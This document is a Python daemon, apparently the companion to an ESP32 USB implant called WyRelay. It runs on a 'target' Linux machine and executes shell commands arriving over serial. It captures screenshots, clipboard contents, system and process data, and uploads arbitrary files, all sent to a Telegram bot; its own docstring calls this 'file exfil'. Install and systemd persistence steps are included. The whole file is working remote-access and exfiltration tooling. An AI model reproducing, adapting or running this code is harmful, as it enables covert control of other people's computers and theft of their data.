#!/usr/bin/env python3
"""
wyrelay-daemon.py — WyRelay companion daemon

Runs on the target Linux machine. Listens on the WyRelay USB serial port,
executes shell commands, captures output, and sends results back to Telegram.
Also handles screenshot capture and file exfil.

Install:
    pip3 install pyserial requests Pillow
    python3 wyrelay-daemon.py --port /dev/ttyACM0 --token YOUR_BOT_TOKEN --chat YOUR_CHAT_ID

Run as service:
    sudo cp wyrelay-daemon.service /etc/systemd/system/
    sudo systemctl enable --now wyrelay-daemon

Protocol (over serial at 115200 baud):
    ESP32 → daemon: CMD:<command>\n
    daemon → ESP32: OUT:<output>\n  (max 4000 chars, truncated)
    daemon → ESP32: ERR:<error>\n
    daemon → TG:    sendMessage / sendPhoto directly via Telegram API
"""

import serial
import subprocess
import requests
import os
import sys
import time
import argparse
import threading
import base64
from pathlib import Path

# ── Config ────────────────────────────────────────────────────────────
parser = argparse.ArgumentParser(description="WyRelay daemon")
parser.add_argument("--port",  default="/dev/ttyACM0", help="Serial port")
parser.add_argument("--baud",  default=115200, type=int)
parser.add_argument("--token", required=True, help="Telegram bot token")
parser.add_argument("--chat",  required=True, help="Allowed Telegram chat ID")
args = parser.parse_args()

BOT_TOKEN   = args.token
ALLOWED_CHAT = str(args.chat)
TG_API      = f"https://api.telegram.org/bot{BOT_TOKEN}"
MAX_OUTPUT  = 3800  # Telegram message limit
SHELL       = "/bin/bash"

# ── Telegram helpers ──────────────────────────────────────────────────
def tg_send(text, chat_id=ALLOWED_CHAT):
    try:
        requests.post(f"{TG_API}/sendMessage", json={
            "chat_id": chat_id,
            "text": text,
            "parse_mode": "HTML"
        }, timeout=10)
    except Exception as e:
        print(f"[tg] send error: {e}")

def tg_photo(path, caption="", chat_id=ALLOWED_CHAT):
    try:
        with open(path, "rb") as f:
            requests.post(f"{TG_API}/sendPhoto", 
                data={"chat_id": chat_id, "caption": caption},
                files={"photo": f},
                timeout=30)
    except Exception as e:
        print(f"[tg] photo error: {e}")

def tg_document(path, caption="", chat_id=ALLOWED_CHAT):
    try:
        with open(path, "rb") as f:
            requests.post(f"{TG_API}/sendDocument",
                data={"chat_id": chat_id, "caption": caption},
                files={"document": f},
                timeout=30)
    except Exception as e:
        print(f"[tg] doc error: {e}")

# ── Command execution ─────────────────────────────────────────────────
def run_shell(cmd, timeout=30):
    try:
        result = subprocess.run(
            cmd, shell=True, executable=SHELL,
            capture_output=True, text=True, timeout=timeout
        )
        out = result.stdout + result.stderr
        exit_code = result.returncode
        return out.strip(), exit_code
    except subprocess.TimeoutExpired:
        return "⏱ Command timed out", 1
    except Exception as e:
        return f"❌ Error: {e}", 1

def take_screenshot():
    path = "/tmp/wyrelay-screenshot.png"
    # Try multiple screenshot tools
    for cmd in [
        f"scrot {path}",
        f"import -window root {path}",
        f"gnome-screenshot -f {path}",
        f"xwd -root -silent | convert xwd:- {path}",
    ]:
        out, code = run_shell(cmd, timeout=10)
        if code == 0 and os.path.exists(path):
            return path
    return None

# ── Process commands from serial ──────────────────────────────────────
def process_command(cmd_line):
    cmd_line = cmd_line.strip()
    if not cmd_line.startswith("CMD:"):
        return
    
    cmd = cmd_line[4:].strip()
    print(f"[cmd] executing: {cmd}")

    # Screenshot
    if cmd == "/screenshot":
        tg_send("📸 Taking screenshot...")
        path = take_screenshot()
        if path:
            tg_photo(path, "📸 Screenshot")
            os.remove(path)
        else:
            tg_send("❌ Screenshot failed — no screenshot tool found (try: apt install scrot)")
        return

    # File upload
    if cmd.startswith("/upload "):
        filepath = cmd[8:].strip()
        if os.path.exists(filepath):
            size = os.path.getsize(filepath)
            if size > 50 * 1024 * 1024:  # 50MB Telegram limit
                tg_send(f"❌ File too large ({size//1024//1024}MB, max 50MB)")
            else:
                tg_send(f"📤 Uploading {filepath} ({size//1024}KB)...")
                tg_document(filepath, f"📄 {os.path.basename(filepath)}")
        else:
            tg_send(f"❌ File not found: {filepath}")
        return

    # Clipboard read
    if cmd == "/clipboard":
        out, code = run_shell("xclip -selection clipboard -o 2>/dev/null || xsel --clipboard --output 2>/dev/null || wl-paste 2>/dev/null")
        if out:
            tg_send(f"📋 Clipboard:\n<code>{out[:MAX_OUTPUT]}</code>")
        else:
            tg_send("❌ Clipboard empty or no clipboard tool (xclip/xsel/wl-paste)")
        return

    # System info
    if cmd == "/sysinfo":
        out, _ = run_shell("echo '=== CPU ===' && uptime && echo '=== RAM ===' && free -h && echo '=== DISK ===' && df -h / && echo '=== IP ===' && hostname -I")
        tg_send(f"💻 System info:\n<code>{out[:MAX_OUTPUT]}</code>")
        return

    # Process list
    if cmd == "/ps":
        out, _ = run_shell("ps aux --sort=-%cpu | head -15")
        tg_send(f"⚙️ Processes:\n<code>{out[:MAX_OUTPUT]}</code>")
        return

    # Shell command (passthrough)
    if cmd.startswith("/shell ") or cmd.startswith("/run "):
        prefix_len = 7 if cmd.startswith("/shell ") else 5
        shell_cmd = cmd[prefix_len:].strip()
        out, code = run_shell(shell_cmd)
        emoji = "✅" if code == 0 else "❌"
        if out:
            # Split long output into chunks
            chunks = [out[i:i+MAX_OUTPUT] for i in range(0, len(out), MAX_OUTPUT)]
            for i, chunk in enumerate(chunks[:3]):  # max 3 messages
                header = f"{emoji} <code>{shell_cmd}</code>" if i == 0 else f"(continued {i+1})"
                tg_send(f"{header}\n<code>{chunk}</code>")
            if len(chunks) > 3:
                tg_send(f"⚠️ Output truncated ({len(out)} chars total)")
        else:
            tg_send(f"{emoji} <code>{shell_cmd}</code>\n(no output, exit {code})")
        return

    tg_send(f"❓ Unknown daemon command: {cmd}")

# ── Serial listener ───────────────────────────────────────────────────
def serial_listener():
    while True:
        try:
            print(f"[serial] connecting to {args.port}...")
            ser = serial.Serial(args.port, args.baud, timeout=1)
            print(f"[serial] connected")
            tg_send(f"🟢 WyRelay daemon connected on {args.port}\nHost: {os.uname().nodename}")
            
            while True:
                line = ser.readline().decode("utf-8", errors="replace").strip()
                if line:
                    print(f"[serial] rx: {line}")
                    process_command(line)
                    
        except serial.SerialException as e:
            print(f"[serial] error: {e}")
            tg_send(f"🔴 WyRelay daemon disconnected: {e}")
            time.sleep(3)
        except Exception as e:
            print(f"[serial] unexpected: {e}")
            time.sleep(3)

# ── Main ──────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print(f"WyRelay daemon v2.0")
    print(f"Port: {args.port} | Chat: {ALLOWED_CHAT}")
    print(f"Bot: {BOT_TOKEN[:10]}...")
    
    tg_send(f"🚀 WyRelay daemon starting...\nHost: {os.uname().nodename}\nPort: {args.port}")
    
    try:
        serial_listener()
    except KeyboardInterrupt:
        tg_send("🔴 WyRelay daemon stopped")
        print("\n[daemon] stopped")
